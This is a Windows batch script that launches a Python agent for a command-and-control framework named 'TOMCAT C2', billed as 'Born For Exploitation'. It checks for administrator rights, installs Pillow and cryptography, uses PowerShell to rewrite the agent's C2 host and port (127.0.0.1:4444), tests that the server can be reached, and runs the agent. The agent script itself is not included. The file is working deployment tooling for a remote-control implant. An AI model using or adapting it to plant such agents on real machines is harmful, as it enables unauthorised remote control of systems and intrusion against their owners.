@echo off
REM TOMCAT C2 Agent Connector for Windows (Batch)
REM Author: TOM7

title TOMCAT C2 Agent Connector
color 0C

REM Configuration
set SERVER_HOST=127.0.0.1
set SERVER_PORT=4444
set AGENT_SCRIPT=tomcatv1a.py

echo.
echo ===============================================================================
echo    ___________________      _____  _________     ________________ _________
echo    \__    ___/\_____  \    /     \ \_   ___ \   /  _  \__    ___/ \_   ___ \
echo      ^|    ^|    /   ^|   \  /  \ /  \/    \  \/  /  /_\  \^|    ^|    /    \  \/
echo      ^|    ^|   /    ^|    \/    Y    \     \____/    ^|    \    ^|    \     \____
echo      ^|____^|   \_______  /\____^|__  /\______  /\____^|__  /____^|     \______  /
echo                       \/         \/        \/         \/                  \/
echo.
echo                    TOMCAT C2 Agent Connector (Windows)
echo                    Author: TOM7 ^| Born For Exploitation
echo ===============================================================================
echo.

REM Check if running as Administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [+] Running as ADMINISTRATOR
) else (
    echo [!] Running as standard user
)
echo.

REM Check if Python is installed
echo [*] Checking Python installation...
where python >nul 2>&1
if %errorLevel% == 0 (
    echo [+] Python found:
    python --version
) else (
    where py >nul 2>&1
    if %errorLevel% == 0 (
        echo [+] Python found:
        py --version
        set PYTHON_CMD=py
    ) else (
        echo [-] Python not found! Please install Python first.
        echo     Download from: https://www.python.org/downloads/
        pause
        exit /b 1
    )
)

if not defined PYTHON_CMD set PYTHON_CMD=python
echo.

REM Check if agent script exists
if not exist "%AGENT_SCRIPT%" (
    echo [-] Agent script not found: %AGENT_SCRIPT%
    echo [!] Please make sure %AGENT_SCRIPT% is in the same directory
    pause
    exit /b 1
)

REM Check and install required modules
echo [*] Checking required Python modules...
%PYTHON_CMD% -c "import PIL" 2>nul
if %errorLevel% neq 0 (
    echo [!] Missing module: PIL/Pillow
    echo [*] Installing Pillow...
    %PYTHON_CMD% -m pip install --upgrade pip
    %PYTHON_CMD% -m pip install pillow
)

%PYTHON_CMD% -c "import cryptography" 2>nul
if %errorLevel% neq 0 (
    echo [!] Missing module: cryptography
    echo [*] Installing cryptography...
    %PYTHON_CMD% -m pip install cryptography
)

echo [+] All required modules are ready
echo.

REM Update agent script with server details
echo [*] Configuring agent for %SERVER_HOST%:%SERVER_PORT%...
powershell -Command "(gc %AGENT_SCRIPT%) -replace 'serverHost = \".*\"', 'serverHost = \"%SERVER_HOST%\"' | Out-File -encoding ASCII %AGENT_SCRIPT%.tmp"
powershell -Command "(gc %AGENT_SCRIPT%.tmp) -replace 'serverPort = [0-9]*', 'serverPort = %SERVER_PORT%' | Out-File -encoding ASCII %AGENT_SCRIPT%.tmp2"
move /y %AGENT_SCRIPT%.tmp2 %AGENT_SCRIPT% >nul 2>&1
del %AGENT_SCRIPT%.tmp >nul 2>&1
echo [+] Agent configured
echo.

REM Test server connectivity
echo [*] Testing connection to %SERVER_HOST%:%SERVER_PORT%...
powershell -Command "$client = New-Object System.Net.Sockets.TcpClient; try { $client.Connect('%SERVER_HOST%', %SERVER_PORT%); $client.Close(); exit 0 } catch { exit 1 }" >nul 2>&1
if %errorLevel% == 0 (
    echo [+] Server is reachable!
) else (
    echo [!] WARNING: Cannot reach server at %SERVER_HOST%:%SERVER_PORT%
    echo [!] Make sure the C2 server is running
    set /p continue="Continue anyway? (Y/N): "
    if /i not "%continue%"=="Y" (
        echo [-] Aborted
        pause
        exit /b 1
    )
)
echo.

REM Launch agent
echo ===============================================================================
echo [*] Launching TOMCAT Agent...
echo [*] Connecting to %SERVER_HOST%:%SERVER_PORT%
echo [!] Press Ctrl+C to stop
echo ===============================================================================
echo.

timeout /t 2 /nobreak >nul

REM Run agent
%PYTHON_CMD% "%AGENT_SCRIPT%"

REM Cleanup on exit
echo.
echo [!] Agent stopped
echo [*] Done!
pause
